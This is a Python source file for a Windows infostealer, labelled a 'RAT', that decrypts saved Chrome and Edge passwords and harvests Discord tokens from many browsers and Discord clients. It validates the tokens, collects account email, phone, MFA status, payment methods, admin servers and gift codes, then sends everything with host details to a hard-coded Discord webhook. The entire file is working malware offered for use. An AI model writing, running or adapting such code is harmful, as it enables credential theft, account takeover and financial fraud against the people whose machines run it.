import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
import time
from datetime import datetime, timedelta
import requests
import re
from discord import Embed
# ===== Password Stealing Code (modified from your provided code) =====
def convert_date(ft):
    utc = datetime.utcfromtimestamp(((10 * int(ft)) - file_name) / nanoseconds)
    return utc.strftime('%Y-%m-%d %H:%M:%S')
def get_master_key_edge():
    try:
        with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Local State', "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
    except: return None
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    return win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)
def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)
def decrypt_password_edge(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = generate_cipher(master_key, iv)
        decrypted_pass = decrypt_payload(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    except Exception as e: return "Chrome < 80"
def get_passwords_edge():
    master_key = get_master_key_edge()
    if master_key is None:
        return {}

    login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Default\Login Data'
    try: shutil.copy2(login_db, "Loginvault.db")
    except: return {}
    conn = sqlite3.connect("Loginvault.db")
    cursor = conn.cursor()
    result = {}
    try:
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")

        for r in cursor.fetchall():
            url = r[0]
            username = r[1]
            encrypted_password = r[2]
            decrypted_password = decrypt_password_edge(encrypted_password, master_key)
            if username != "" or decrypted_password != "":
                result[url] = [username, decrypted_password]
    except: pass
    cursor.close(); conn.close()
    try: os.remove("Loginvault.db")
    except Exception as e: print(e); pass
    return result
def get_chrome_datetime(chromedate):
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
def get_encryption_key_chrome():
    try:
        local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    except: time.sleep(1); return None
def decrypt_password_chrome(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try: return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except: return ""
def get_passwords_chrome():
    key = get_encryption_key_chrome()
    if key is None:
        return {}
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
    file_name = "ChromeData.db"
    try:
        shutil.copyfile(db_path, file_name)
    except FileNotFoundError:
        return {}
    db = sqlite3.connect(file_name)
    cursor = db.cursor()
    result = {}
    try:
        cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")

        for row in cursor.fetchall():
            action_url = row[1]
            username = row[2]
            password = decrypt_password_chrome(row[3], key)
            if username or password:
                result[action_url] = [username, password]
            else: continue
    except Exception as e:
        print(f"Error during Chrome password extraction: {e}")
    cursor.close(); db.close()
    try: os.remove(file_name)
    except: pass
    return result
def grab_passwords():
    global file_name, nanoseconds
    file_name, nanoseconds = 116444736000000000, 10000000
    result = {}
    try: result = get_passwords_chrome()
    except: time.sleep(1)
    try: 
        result2 = get_passwords_edge()
        for i in result2.keys():
            result[i] = result2[i]
    except: time.sleep(1)
    return result
# ===== Discord Token Stealing Code (modified from your provided code) =====
class grab_discord():
    def initialize(raw_data):
        return fetch_tokens().upload(raw_data)
        
class extract_tokens:
    def __init__(self) -> None:
        self.base_url = "https://discord.com/api/v9/users/@me"
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.regexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        self.regexp_enc = r"dQw4w9WgXcQ:[^\"]*"
        self.tokens, self.uids = [], []
        self.extract()
    def extract(self) -> None:
        paths = {
            'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
            'Opera': self.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': self.appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': self.appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': self.appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': self.appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': self.appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': self.appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': self.appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': self.appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome1': self.appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
            'Chrome2': self.appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
            'Chrome3': self.appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
            'Chrome4': self.appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
            'Chrome5': self.appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': self.appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
            'Uran': self.appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': self.appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
        }
        for name, path in paths.items():
            if not os.path.exists(path): continue
            _discord = name.replace(" ", "").lower()
            if "cord" in path:
                if not os.path.exists(self.roaming+f'\\{_discord}\\Local State'): continue
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]: continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for y in re.findall(self.regexp_enc, line):
                            token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming+f'\\{_discord}\\Local State'))
                    
                            if self.validate_token(token):
                                uid = requests.get(self.base_url, headers={'Authorization': token}).json()['id']
                                if uid not in self.uids:
                                    self.tokens.append(token)
                                    self.uids.append(uid)
            else:
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]: continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regexp, line):
                            if self.validate_token(token):
                                uid = requests.get(self.base_url, headers={'Authorization': token}).json()['id']
                                if uid not in self.uids:
                                    self.tokens.append(token)
                                    self.uids.append(uid)
        if os.path.exists(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
            for path, _, files in os.walk(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
                for _file in files:
                    if not _file.endswith('.sqlite'):
                        continue
                    try:
                        with open(f'{path}\\{_file}', errors='ignore') as f:
                            for line in [x.strip() for x in f.readlines() if x.strip()]:
                                for token in re.findall(self.regexp, line):
                                    if self.validate_token(token):
                                        uid = requests.get(self.base_url, headers={'Authorization': token}).json()['id']
                                        if uid not in self.uids:
                                            self.tokens.append(token)
                                            self.uids.append(uid)
                    except:
                        continue
    def validate_token(self, token: str) -> bool:
        r = requests.get(self.base_url, headers={'Authorization': token})
        if r.status_code == 200: return True
        return False
    
    def decrypt_val(self, buff: bytes, master_key: bytes) -> str:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    def get_master_key(self, path: str) -> str:
        if not os.path.exists(path): return
        if 'os_crypt' not in open(path, 'r', encoding='utf-8').read(): return
        with open(path, "r", encoding="utf-8") as f: c = f.read()
        local_state = json.loads(c)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key
class fetch_tokens:
    def __init__(self):
        self.tokens = extract_tokens().tokens
    
    def upload(self, raw_data):
        if not self.tokens:
            return
        final_to_return = []
        for token in self.tokens:
            try:
                user = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token}).json()
                billing = requests.get('https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': token}).json()
                guilds = requests.get('https://discord.com/api/v9/users/@me/guilds?with_counts=true', headers={'Authorization': token}).json()
                gift_codes = requests.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers={'Authorization': token}).json()
                username = user['username'] + '#' + user['discriminator']
                user_id = user['id']
                email = user['email']
                phone = user['phone']
                mfa = user['mfa_enabled']
                avatar = f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.gif" if requests.get(f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.png"
                
                if user['premium_type'] == 0:
                    nitro = 'None'
                elif user['premium_type'] == 1:
                    nitro = 'Nitro Classic'
                elif user['premium_type'] == 2:
                    nitro = 'Nitro'
                elif user['premium_type'] == 3:
                    nitro = 'Nitro Basic'
                else:
                    nitro = 'None'
                if billing:
                    payment_methods = []
                    for method in billing:
                        if method['type'] == 1:
                            payment_methods.append('Credit Card')
                        elif method['type'] == 2:
                            payment_methods.append('PayPal')
                        else:
                            payment_methods.append('Unknown')
                    payment_methods = ', '.join(payment_methods)
                else: payment_methods = None
                if guilds:
                    hq_guilds = []
                    for guild in guilds:
                        admin = int(guild["permissions"]) & 0x8 != 0
                        if admin and guild['approximate_member_count'] >= 100:
                            owner = '✅' if guild['owner'] else '❌'
                            invites = requests.get(f"https://discord.com/api/v8/guilds/{guild['id']}/invites", headers={'Authorization': token}).json()
                            if len(invites) > 0: invite = 'https://discord.gg/' + invites[0]['code']
                            else: invite = "https://youtu.be/dQw4w9WgXcQ"
                            data = f"\u200b\n**{guild['name']} ({guild['id']})** \n Owner: `{owner}` | Members: ` ⚫ {guild['approximate_member_count']} / 🟢 {guild['approximate_presence_count']} / 🔴 {guild['approximate_member_count'] - guild['approximate_presence_count']} `\n[Join Server]({invite})"
                            if len('\n'.join(hq_guilds)) + len(data) >= 1024: break
                            hq_guilds.append(data)
                    if len(hq_guilds) > 0: hq_guilds = '\n'.join(hq_guilds) 
                    else: hq_guilds = None
                else: hq_guilds = None
                
                if gift_codes:
                    codes = []
                    for code in gift_codes:
                        name = code['promotion']['outbound_title']
                        code = code['code']
                        data = f":gift: `{name}`\n:ticket: `{code}`"
                        if len('\n\n'.join(codes)) + len(data) >= 1024: break
                        codes.append(data)
                    if len(codes) > 0: codes = '\n\n'.join(codes)
                    else: codes = None
                else: codes = None
                if not raw_data:
                    embed = Embed(title=f"{username} ({user_id})", color=0x0084ff)
                    embed.set_thumbnail(url=avatar)
                    embed.add_field(name="\u200b\n📜 Token:", value=f"```{token}```\n\u200b", inline=False)
                    embed.add_field(name="💎 Nitro:", value=f"{nitro}", inline=False)
                    embed.add_field(name="💳 Billing:", value=f"{payment_methods if payment_methods != '' else 'None'}", inline=False)
                    embed.add_field(name="🔒 MFA:", value=f"{mfa}\n\u200b", inline=False)
                    
                    embed.add_field(name="📧 Email:", value=f"{email if email != None else 'None'}", inline=False)
                    embed.add_field(name="📳 Phone:", value=f"{phone if phone != None else 'None'}\n\u200b", inline=False)    
                    if hq_guilds != None:
                        embed.add_field(name="🏰 HQ Guilds:", value=hq_guilds, inline=False)
                    if codes != None:
                        embed.add_field(name="\u200b\n🎁 Gift Codes:", value=codes, inline=False)
                    final_to_return.append(embed)
                else:
                    #final_to_return.append(f'Username: {username} ({user_id})\nToken: {token}\nNitro: {nitro}\nBilling: {payment_methods if payment_methods != "" else "None"}\nMFA: {mfa}\nEmail: {email if email != None else "None"}\nPhone: {phone if phone != None else "None"}\nHQ Guilds: {hq_guilds}\nGift codes: {codes}')
                    final_to_return.append(json.dumps({'username': username, 'token': token, 'nitro': nitro, 'billing': (payment_methods if payment_methods != "" else "None"), 'mfa': mfa, 'email': (email if email != None else "None"), 'phone': (phone if phone != None else "None"), 'hq_guilds': hq_guilds, 'gift_codes': codes}))
            except: pass
        return final_to_return
# ===== RAT Core =====
WEBHOOK_URL = "https://discord.com/api/webhooks/1386784234575892583/H8_gNUoEA69rQpTj81IJ45F5T7nRxv041KPXlbu-uRWx_Tgsg9tAg8Rr70jkw9n6UJyo"  # Replace with your Discord webhook URL

def get_system_info():
    import platform
    import socket
    return f"""
    System Information:
    - OS: {platform.system()} {platform.release()}
    - Hostname: {socket.gethostname()}
    - Username: {os.getlogin()}
    """

def send_to_webhook(content):
    try:
        data = {"content": content}
        requests.post(WEBHOOK_URL, data=data)
    except Exception as e:
        print(f"Error sending to webhook: {e}")

def send_embed_to_webhook(embeds):
    try:
        data = {"embeds": [embed.to_dict() for embed in embeds]}
        requests.post(WEBHOOK_URL, json=data)
    except Exception as e:
        print(f"Error sending embed to webhook: {e}")

def main():
    # 1. System Information
    system_info = get_system_info()
    send_to_webhook(system_info)
    # 2. Password Stealing
    passwords = grab_passwords()
    if passwords:
        password_string = "Passwords:\n"
        for url, creds in passwords.items():
            password_string += f"- {url}: Username: {creds[0]}, Password: {creds[1]}\n"
        send_to_webhook(password_string)
    else:
        send_to_webhook("No passwords found.")
    # 3. Token Stealing
    tokens = grab_discord().initialize(raw_data=False)
    if tokens:
        send_embed_to_webhook(tokens) #embed
        token_string = ""
        for token in tokens:
            token_string = token.to_dict()
        #send_to_webhook(token_string)
    else:
        send_to_webhook("No Discord tokens found.")

if __name__ == "__main__":
    main()